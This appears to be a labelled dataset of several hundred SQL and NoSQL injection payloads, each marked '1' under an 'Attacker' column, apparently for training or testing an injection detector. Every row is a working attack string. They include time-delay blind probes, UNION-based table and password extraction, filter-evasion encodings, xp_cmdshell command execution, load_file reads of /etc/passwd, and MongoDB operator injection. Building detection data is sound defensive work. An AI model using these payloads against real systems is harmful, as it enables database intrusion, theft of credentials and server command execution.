Payload	Attacker
))) waitfor delay '0:0:20' /* 	1
))) waitfor delay '0:0:20' --	1
))))) waitfor delay '0:0:20' --	1
)))))) waitfor delay '0:0:20' --	1
""") waitfor delay '0:0:20' /* "	1
""") waitfor delay '0:0:20' --"	1
""")) waitfor delay '0:0:20' /* "	1
""")) waitfor delay '0:0:20' --"	1
"""))) waitfor delay '0:0:20' /* "	1
"""))) waitfor delay '0:0:20' --"	1
""")))) waitfor delay '0:0:20' /* "	1
""")))) waitfor delay '0:0:20' --"	1
"""))))) waitfor delay '0:0:20' /* "	1
"""))))) waitfor delay '0:0:20' --"	1
""")))))) waitfor delay '0:0:20' /* "	1
""")))))) waitfor delay '0:0:20' --"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* "	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*"	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"	1
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*	1
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--	1
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--	1
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23	1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"	1
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*	1
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*	1
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--	1
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"	1
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"	1
and 0=benchmark(3000000,MD5(1))%20%23	1
' and 0=benchmark(3000000,MD5(1))%20/*	1
""" and 0=benchmark(3000000,MD5(1))%20/*"	1
""" and 0=benchmark(3000000,MD5(1))%20--"	1
) and 0=benchmark(3000000,MD5(1))%20--	1
) and 0=benchmark(3000000,MD5(1))%20%23	1
)) and 0=benchmark(3000000,MD5(1))%20%23	1
))) and 0=benchmark(3000000,MD5(1))%20/*	1
)))) and 0=benchmark(3000000,MD5(1))%20/*	1
)))) and 0=benchmark(3000000,MD5(1))%20--	1
') and 0=benchmark(3000000,MD5(1))%20--	1
') and 0=benchmark(3000000,MD5(1))%20%23	1
""") and 0=benchmark(3000000,MD5(1))%20%23"	1
')) and 0=benchmark(3000000,MD5(1))%20/*	1
""")) and 0=benchmark(3000000,MD5(1))%20/*"	1
""")) and 0=benchmark(3000000,MD5(1))%20--"	1
'))) and 0=benchmark(3000000,MD5(1))%20--	1
'))) and 0=benchmark(3000000,MD5(1))%20%23	1
"""))) and 0=benchmark(3000000,MD5(1))%20%23"	1
')))) and 0=benchmark(3000000,MD5(1))%20/*	1
""")))) and 0=benchmark(3000000,MD5(1))%20/*"	1
""")))) and 0=benchmark(3000000,MD5(1))%20--"	1
; WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(USER)=N) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(lower(substring((DB_NAME()),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=N) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’FirstTableName’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’PreviouslyFoundTable’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 ColumnName from TableName)=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(substring((SELECT TOP 1 ColumnName from TableName),N,1))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; WAITFOR DELAY '00:00:10'-- 	1
; WAITFOR DELAY '00:00:10'--	1
; IF (LEN(DB_NAME())=N) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((DB_NAME()),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’FirstTableName’)Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’FirstTableName’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (LEN(SELECT TOP 1 ColumnName from TableName)=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 ColumnName from TableName where ColumnName NOT in ('FoundTableName') order by TableName desc),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
waitfor delay '0:0:10'--	1
%20waitfor%20delay%20'0:0:20'--	1
waitfor delay '0:0:10'/*	1
%20waitfor%20delay%20'0:0:20'/*	1
'  waitfor delay '0:0:10'--+	1
'%20waitfor%20delay%20'0:0:20'--+	1
and 0=benchmark(3000000,MD5(1))--	1
%20and%200=benchmark(3000000,MD5(1))%20--	1
and 0=benchmark(3000000,MD5(1))/*	1
%20and%200=benchmark(3000000,MD5(1))%20/*	1
' and 0=benchmark(3000000,MD5(1))--+	1
'%20and%200=benchmark(3000000,MD5(1))%20--+	1
sleep(__TIME__)#	1
' or sleep(__TIME__)#	1
""" or sleep(__TIME__)="""	1
""") or sleep(__TIME__)="""	1
') or sleep(__TIME__)='	1
')) or sleep(__TIME__)='	1
pg_sleep(__TIME__)--	1
' or pg_sleep(__TIME__)--	1
1) or pg_sleep(__TIME__)--	1
1)) or pg_sleep(__TIME__)--	1
""")) or pg_sleep(__TIME__)--"	1
+union+select+	1
/**/union/**/select/**/	1
/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/	1
union all select 	1
/**/UNunionION/**/all/**/SELselectECT/**/	1
/**//*UnIOn*//**/all/**//*SEleCt*//**/	1
/**/union/**/select/**/1,2--	1
/**/union/**/select/**/1,2,3--	1
/**/union/**/select/**/1,2,3,4,5,6--	1
/**/union/**/select/**/1,2,3,4,5,6,7--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55--	1
+union+select+1,2,3--	1
+union+select+1,2,3,4--	1
+union+select+1,2,3,4,5,6,7--	1
+union+select+1,2,3,4,5,6,7,8--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55--	1
true, $where: '1 == 1'	1
', $where: '1 == 1'	1
1, $where: '1 == 1'	1
' } ], $comment:'successful MongoDB injection'	1
db.injection.insert({success:1});	1
' && this.password.match(/.*/)//+%00	1
' && this.passwordzz.match(/.*/)//+%00	1
{$gt: ''}	1
[$ne]=1	1
; execute immediate 'sel' || 'ect us' || 'er'	1
benchmark(10000000,MD5(1))#	1
1) or pg_sleep(__TIME__)--	1
||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1
like	1
""" or sleep(__TIME__)#"	1
declare @q nvarchar (200) 0x730065006c00650063 ...	1
or 0=0 #	1
) or ('a'='a	1
; exec xp_regread	1
1)) or benchmark(10000000,MD5(1))#	1
asc	1
""" or benchmark(10000000,MD5(1))#"	1
# from wapiti	1
or 'a'='a	1
"hi or 1=1 --"""	1
) or sleep(__TIME__)='	1
)) or benchmark(10000000,MD5(1))#	1
21 %	1
limit	1
""")) or benchmark(10000000,MD5(1))#"	1
PRINT	1
));waitfor delay '0:0:__TIME__'--	1
a' waitfor delay '0:0:10'--	1
1 or sleep(__TIME__)#	1
or 1=1	1
or 'text' = n'text'	1
--	1
exec xp	1
; exec master..xp_cmdshell 'ping 172.10.1.255'--	1
x' AND email IS NULL; --	1
&	1
//	1
truncate	1
declare @s varchar(200) select @s = 0x77616974 ...	1
tz_offset	1
||6	1
or%201=1 --	1
) union select * from information_schema.tables;	1
PRINT @@variable	1
""" or ""a""=""a"	1
(sqlvuln)	1
and 1=( if((load_file(char(110,46,101,120,11 ...	1
0x770061006900740066006F0072002000640065006C00 ...	1
1)) or pg_sleep(__TIME__)--	1
/**/or/**/1/**/=/**/1	1
(sqlattempt2)	1
or (EXISTS)	1
1 or benchmark(10000000,MD5(1))#	1
%20or%20''='	1
hi' or 'x'='x';	1
""") or sleep(__TIME__)="""	1
union select 1,load_file('/etc/passwd'),1,1,1;	1
0x77616974666F722064656C61792027303A303A313027 ...	1
union select	1
or sleep(__TIME__)#	1
a' or 'a' = 'a	1
declare @s varchar(22) select @s =	1
or '1'='1	1
|	1
"or 0=0 #"""	1
having	1
declare @s varchar (8000) select @s = 0x73656c ...	1
â or 1=1 --	1
bfilename	1
having 1=1--	1
;waitfor delay '0:0:__TIME__'--	1
""" or 1=1--"	1
or 'text' > 't'	1
(select top 1	1
a' or 3=3--	1
-- &password=	1
; exec master..xp_cmdshell	1
%20or%20x=x	1
0x730065006c0065006300740020004000400076006500 ...	1
hi' or 1=1 --	1
or 'something' = 'some'+'thing'	1
exec sp	1
Ã½ or 1=1 --	1
1 or pg_sleep(__TIME__)--	1
uni/**/on sel/**/ect	1
replace	1
%7C	1
x' AND 1=(SELECT COUNT(*) FROM tabname); --	1
declare @q nvarchar (200) select @q = 0x770061 ...	1
1 or 1=1	1
/	1
anything' OR 'x'='x	1
desc	1
||'6	1
or 0=0 #	1
select name from syscolumns where id = (sele ...	1
password:*/=1--	1
distinct	1
""") or benchmark(10000000,MD5(1))#"	1
UNION SELECT	1
or 1=1 /*	1
)) or sleep(__TIME__)='	1
sqlvuln;	1
union select * from users where login = char ...	1
â or 3=3 --	1
@variable	1
//*	1
%2A%7C	1
?	1
or 1/*	1
or a = a	1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)	1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)	1
' or 1=1	1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--	1
'%20or%20''='	1
' or 0=0 --	1
' or 0=0 #	1
' or '1'='1'--	1
' or 1 --'	1
"or 1=1 or """"="	1
' or a=a--	1
'hi' or 'x'='x';	1
or	1
' or username like '%	1
' or uname like '%	1
' or user like '%	1
'; exec master..xp_cmdshell	1
--sp_password	1
' UNION SELECT	1
' (select top 1	1
'||UTL_HTTP.REQUEST	1
'%20or%201=1	1
'sqlattempt1	1
%26	1
%21	1
 or 3=3 --	1
"""sqlMessage"":""XPATH syntax error: ':/p28dbdata/db/'"""	1
1'+AND+1=extractvalue(rand(),concat(0x3a,@@hostname))--+	1
"""sqlMessage"":""XPATH syntax error: ':5.7.26-log'"""	1
1'+AND+1=extractvalue(rand(),concat(0x3a,current_user()))--+	1
"""sqlMessage"":""XPATH syntax error: ':progress28app@172.x.x.28'"""	1
1'+AND+1=extractvalue(rand(),concat(0x3a,database()))--+	1
/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)	1
/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)	1
{“param”:”1′)))+MySQL_payload–+-“}	1
@foo union(((select table_name from information_schema.tables limit 1,1)))	1
id union(((select table_name from information_schema.tables limit 1,1)))	1
test'-@version union (select table)	1
test'-'xyz' union (select table)	1
1- union(select table_name from information_schema.tables limit 1,1)	1
@version - @version union(select table_name from information_schema.tables limit 1,1)	1
1--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29	1
1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29	1
(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- 	1
((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- 	1
@x OR (@y) UNION ALL SELECT name,email,password FROM users--	1
-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;	1
1 and true; BEGIN DECLARE @xy varchar(8000)	1
1; BEGIN DECLARE @xy varchar(8000)	1
' AND 1=0; DECLARE @S VARCHAR(4000) SET @S	1
1 having 1 limit 1 union select 1--	1
1 having sin(1) limit 1 union select 1--	1
1 having 1 limit 2 group by 3 union select 1--	1
@version group by 1 union select 1--	1
@version group by (-1) union select 1--	1
(@version)) group by (-1) union select 1--	1
(1)) group by (-1) union select 1--	1
1 group by 1 - sin(1) union select 1--	1
1 group by (sin(1)) union select 1--	1
sin(1)-1 group by (-sin(1)) union select 1--	1
sin(1)-1 group by 1 union select 1--	1
((1)) group by (1) union select 1--	1
(1) group by ((1)) union select 1--	1
-(true) for update UNION select table_name from information_schema.tables limit 1	1
-(null) for update UNION select table_name from information_schema.tables limit 1	1
-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1	1
-(1) for update having 1 UNION select table_name from information_schema.tables limit 1	1
-(1) having 1 for update UNION select table_name from information_schema.tables limit 1	1
-1 union distinct select table_name from information_schema.tables	1
-1 union all select table_name from information_schema.tables	1
if(1, -1, 2) union select table_name from information_schema.tables limit 1	1
true in(2, (select 2)) union select table_name from information_schema.tables limit 1	1
true in(2, 1) union select table_name from information_schema.tables limit 1	1
(1 between 1 and @version) & 1 UNION SELECT 1	1
(1 between '1' and @version) & 1 UNION SELECT 1	1
(1 between 1 and '2') & 1 UNION SELECT 1	1
(1 between '1' and 2) & 1 UNION SELECT 1	1
(@version between 1 and '2') & 1 UNION SELECT 1	1
ANY(SELECT 1) - 1 UNION ALL --	1
1 - ANY(SELECT 1) UNION ALL --	1
1%A0UNION%A0SELECT%A02--	1
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))	1
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))	1
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))	1
"SLEEP(1)/*'or SLEEP(1)or'""or SLEEP(1)"	1
id=2/*/*/union/*/*/select/*/*/from/*/*/1,2,3	1
1' unIoN SeLect 1	1
1' union/**/select/**/1	1
1' union/**)*/select/**)*/1	1
1' union all select 1	1
1' union distinct select 1	1
xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;	1
"(select ""/*"") union all select xxx from xxx-- */"	1
1' \Nunion select 1	1
001100100010011100100000011101010110111001101001011011110110111000100000011100110110010101101100011001010110001101110100001000000011000100101100001100100010110000110011001011000111010101110011011001010111001000101000001010010010110000110101001011000011011000100000011001100111001001101111011011010010000000100011	1
SELECT(UNHEX(UNHEX(333532453335324533323335)));	1
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '	1
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0	1
where id=.1union/*.1*/select-.1	1
where id=.1union/*.1*/select(1)	1
where id=.1union/*.1*/select`host`from mysql.user	1
